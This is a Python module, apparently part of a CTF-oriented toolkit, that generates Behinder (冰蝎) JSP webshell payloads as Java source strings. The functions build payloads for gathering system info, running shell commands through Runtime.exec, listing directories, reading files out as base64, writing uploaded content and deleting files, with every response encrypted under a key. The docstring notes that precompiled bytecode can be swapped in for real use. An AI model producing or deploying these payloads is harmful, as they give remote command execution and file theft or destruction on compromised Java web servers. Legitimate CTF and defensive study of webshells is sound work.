"""冰蝎 JSP 载荷（源码字符串形式）。

真实冰蝎 JSP 走 defineClass 加载 .class 字节码；本引擎首阶段以 Java 源码字符串
表达等价语义，前置 `/*CTFBOX_BH|op|b64...*/` 机读标签，测试解释器据此仿真。
真实对接时可换成预编译字节码，标签形式保持一致。
"""

from __future__ import annotations

import base64

from ...base import Operation


def _b64(value: str | bytes) -> str:
    data = value.encode("utf-8") if isinstance(value, str) else value
    return base64.b64encode(data).decode("ascii")


def _tag(op: str, *b64parts: str) -> str:
    return "/*CTFBOX_BH|" + "|".join((op, *b64parts)) + "*/"


def _wrap(tag: str, body: str, key: str) -> str:
    """公共外壳：初始化 key，执行 body（须把结果写入 String o），加密回显。"""
    return (
        f"{tag}\n"
        f'String k="{key}";String o="";\n'
        f"{body}\n"
        f'out.print(Behinder.encrypt(o,k));'
    )


def render(operation: str, params: dict, key: str) -> str:
    if operation == Operation.SYSINFO:
        tag = _tag(Operation.SYSINFO)
        body = (
            'o="{\\"os\\":\\""+System.getProperty("os.name")+"\\",\\"user\\":\\""'
            '+System.getProperty("user.name")+"\\",\\"cwd\\":\\""'
            '+new java.io.File(".").getCanonicalPath()+"\\"}";'
        )
        return _wrap(tag, body, key)

    if operation == Operation.EXEC:
        b = _b64(params["cmd"])
        tag = _tag(Operation.EXEC, b)
        body = (
            f'String c=new String(java.util.Base64.getDecoder().decode("{b}"));'
            'Process p=Runtime.getRuntime().exec(new String[]{"sh","-c",c});'
            'java.io.InputStream is=p.getInputStream();'
            'java.io.ByteArrayOutputStream b0=new java.io.ByteArrayOutputStream();'
            'int n;byte[] buf=new byte[4096];while((n=is.read(buf))!=-1)b0.write(buf,0,n);'
            'o=new String(b0.toByteArray(),"UTF-8");'
        )
        return _wrap(tag, body, key)

    if operation == Operation.LIST:
        b = _b64(params.get("path", "."))
        tag = _tag(Operation.LIST, b)
        body = (
            f'java.io.File d=new java.io.File(new String(java.util.Base64.getDecoder().decode("{b}")));'
            'java.io.File[] fs=d.listFiles();StringBuilder sb=new StringBuilder();'
            'if(fs!=null){for(java.io.File f:fs){'
            'sb.append(f.getName()).append("\\t")'
            '.append(f.isDirectory()?"dir":"file").append("\\t")'
            '.append(f.isFile()?f.length():0L).append("\\n");}}'
            'o=sb.toString();'
        )
        return _wrap(tag, body, key)

    if operation == Operation.READ:
        b = _b64(params["path"])
        tag = _tag(Operation.READ, b)
        body = (
            f'java.io.File f=new java.io.File(new String(java.util.Base64.getDecoder().decode("{b}")));'
            'java.io.FileInputStream fi=new java.io.FileInputStream(f);'
            'java.io.ByteArrayOutputStream b0=new java.io.ByteArrayOutputStream();'
            'int n;byte[] buf=new byte[4096];while((n=fi.read(buf))!=-1)b0.write(buf,0,n);fi.close();'
            'o=java.util.Base64.getEncoder().encodeToString(b0.toByteArray());'
        )
        return _wrap(tag, body, key)

    if operation == Operation.WRITE:
        bp = _b64(params["path"])
        bc = params["content"]  # 已是 base64
        tag = _tag(Operation.WRITE, bp, bc)
        body = (
            f'byte[] data=java.util.Base64.getDecoder().decode("{bc}");'
            f'java.io.FileOutputStream fo=new java.io.FileOutputStream('
            f'new String(java.util.Base64.getDecoder().decode("{bp}")));'
            'fo.write(data);fo.close();o=Integer.toString(data.length);'
        )
        return _wrap(tag, body, key)

    if operation == Operation.DELETE:
        b = _b64(params["path"])
        tag = _tag(Operation.DELETE, b)
        body = (
            f'java.io.File f=new java.io.File(new String(java.util.Base64.getDecoder().decode("{b}")));'
            'o=f.delete()?"1":"0";'
        )
        return _wrap(tag, body, key)

    raise ValueError(f"冰蝎 JSP 载荷不支持操作：{operation}")
